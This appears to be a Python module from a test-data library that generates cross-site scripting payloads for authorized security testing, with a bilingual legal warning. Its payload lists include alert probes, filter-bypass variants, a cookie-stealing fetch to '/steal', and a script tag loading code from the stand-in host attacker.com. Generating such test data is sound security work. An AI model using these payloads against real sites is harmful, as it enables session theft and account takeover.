"""
XSS攻击Payload生成器

⚠️ **CRITICAL SECURITY WARNING / 重要安全警告** ⚠️

This generator creates XSS (Cross-Site Scripting) attack payloads for AUTHORIZED
SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in:

本生成器创建XSS跨站脚本攻击载荷，仅用于授权安全测试。未经授权的使用是非法的，可能导致：

LEGAL CONSEQUENCES / 法律后果:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 U.S.: Computer Fraud and Abuse Act (CFAA) - Up to 10 years imprisonment
🚨 China: Criminal Law Article 285/286 - 刑法第285/286条 - 最高7年有期徒刑
🚨 EU: Directive 2013/40/EU - Criminal penalties including imprisonment
🚨 Civil liability: Damages, injunctions, attorney fees
🚨 Professional consequences: Loss of certifications, employment termination

AUTHORIZED USE ONLY / 仅限授权使用:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Written authorization from system owner / 系统所有者的书面授权
✅ Penetration testing engagement with signed contract / 有签约的渗透测试项目
✅ Bug bounty programs with clear scope / 明确范围的漏洞赏金计划
✅ Educational lab environments (isolated, non-production) / 教育实验环境（隔离、非生产）
✅ Personal systems you own / 您拥有的个人系统

PROHIBITED USES / 禁止用途:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ Testing production systems without authorization / 未经授权测试生产系统
❌ Unauthorized vulnerability scanning / 未经授权的漏洞扫描
❌ Malicious attacks or data theft / 恶意攻击或数据窃取
❌ Circumventing security controls without permission / 未经许可规避安全控制
❌ Any use that violates laws or regulations / 任何违反法律法规的用途

RESPONSIBILITY / 责任声明:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
By using this tool, you acknowledge that:
使用此工具即表示您确认：
- You have proper authorization for all testing activities / 您对所有测试活动拥有适当授权
- You understand and accept all legal risks / 您理解并接受所有法律风险
- You will use this tool ethically and responsibly / 您将道德且负责任地使用此工具
- The authors/maintainers are not liable for misuse / 作者/维护者不对滥用负责

提供多种类型的XSS测试payload用于安全测试和漏洞研究
"""

import secrets
from collections.abc import Mapping
from typing import Any

from dataforge.core.factory import register_generator
from dataforge.core.generator import (
    DataGenerator,
    GenerationContext,
    GeneratorConfig,
    GeneratorType,
)


class XSSPayloadGenerator(DataGenerator):
    """XSS攻击测试payload生成器"""

    def __init__(self, config: GeneratorConfig | Mapping[str, Any] | None = None):
        """
        接受严格的 GeneratorConfig 或者 Mapping 并在内部规范化为 GeneratorConfig。
        这样既兼容旧用法（传 dict），也满足严格类型检查。
        """
        if config is None:
            normalized = GeneratorConfig(generator_type="xss_payload", parameters={})
        elif isinstance(config, GeneratorConfig):
            normalized = config
        else:
            # 将传入的 Mapping 规范化为 GeneratorConfig
            gen_type = str(config.get("generator_type", "xss_payload"))
            if "parameters" in config and isinstance(config["parameters"], dict):
                params: dict[str, Any] = dict(config["parameters"])
            else:
                # 将整个映射视为参数字典
                params = dict(config)
            normalized = GeneratorConfig(generator_type=gen_type, parameters=params)

        super().__init__(normalized)
        self._setup()

    def _setup(self) -> None:
        """初始化设置"""
        self.supported_types = ["reflected", "stored", "dom"]
        self.xss_type = self.parameters.get("xss_type", "reflected")
        self.complexity = self.parameters.get("complexity", "basic")

    @property
    def generator_type(self) -> GeneratorType:
        """生成器类型"""
        return GeneratorType.ADVANCED

    @property
    def supported_parameters(self) -> list[str]:
        """支持的参数列表"""
        return ["xss_type", "complexity"]

    def _generate_raw(self, context=None) -> str:
        """生成单个XSS payload"""

        # XSS payload模板

        payloads = {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')></iframe>",
            ],
            "advanced": [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=fetch('/steal?c='+document.cookie)>",
                "<svg onload=eval(atob('YWxlcnQoMSk='))>",
                "<script src=http://attacker.com/xss.js></script>",
                "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
            ],
            "bypass": [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=java\u0073cript:alert('XSS')></iframe>",
                "<script>alert`XSS`</script>",
            ],
        }

        # 根据复杂度选择payload类型

        if self.complexity == "basic":
            payload_list = payloads["basic"]

        elif self.complexity == "advanced":
            payload_list = payloads["basic"] + payloads["advanced"]

        else:  # bypass
            payload_list = payloads["basic"] + payloads["advanced"] + payloads["bypass"]

        # 确保列表不为空

        if not payload_list:
            return "<script>alert('XSS')</script>"

        return secrets.choice(payload_list)

    def validate(self, data: str) -> bool:
        """验证payload是否为有效的XSS测试字符串"""
        if not isinstance(data, str):
            return False

        xss_patterns = [
            "<script",
            "<img",
            "<svg",
            "javascript:",
            "onerror=",
            "onload=",
            "alert(",
            "prompt(",
            "confirm(",
        ]

        return any(pattern in data.lower() for pattern in xss_patterns)

    # 额外的高级方法
    def generate_payload(
        self, xss_type: str | None = None, complexity: str | None = None
    ) -> str:
        """生成指定类型的payload"""

        old_type = self.xss_type

        old_complexity = self.complexity

        if xss_type:
            self.xss_type = xss_type

        if complexity:
            self.complexity = complexity

        result = self._generate_raw()

        self.xss_type = old_type

        self.complexity = old_complexity

        return result or "default_xss_payload"

    def get_event_handlers(self) -> list[str]:
        """获取常用的事件处理器"""
        return [
            "onerror",
            "onload",
            "onmouseover",
            "onfocus",
            "onclick",
            "onmouseout",
            "onblur",
            "onchange",
            "onsubmit",
            "onreset",
        ]

    def generate_single(self, context: GenerationContext | None = None) -> str:
        """生成单个数据项"""

        # 尝试调用现有方法

        if hasattr(self, "generate") and callable(self.generate):
            return self._generate_raw()

        elif hasattr(self, "_generate_raw") and callable(self._generate_raw):
            return self._generate_raw(context)

        else:
            # 基本实现

            return "generated_data"


@register_generator("xss_payload", ["xss", "xss_script", "xss_payload"])
class GenericXSSPayloadGenerator(XSSPayloadGenerator):
    """通用XSS Payload生成器"""

    pass

    @property
    def generator_type(self) -> GeneratorType:
        """返回生成器类型"""

        return GeneratorType.ADVANCED

    @property
    def supported_parameters(self) -> list[str]:
        """返回支持的参数列表"""

        return []
